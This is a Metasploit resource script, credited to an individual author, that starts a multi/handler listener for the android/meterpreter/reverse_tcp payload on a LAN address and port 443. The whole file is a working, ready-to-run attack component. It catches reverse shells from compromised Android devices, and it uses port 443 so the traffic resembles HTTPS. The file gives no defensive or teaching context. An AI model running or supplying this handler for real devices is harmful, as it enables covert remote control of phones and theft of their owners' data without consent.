# Script created by Aaron Vigal http://www.aaronvigal.com
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp 
set lhost 192.168.2.10
set lport 443
clear
exploit
exit
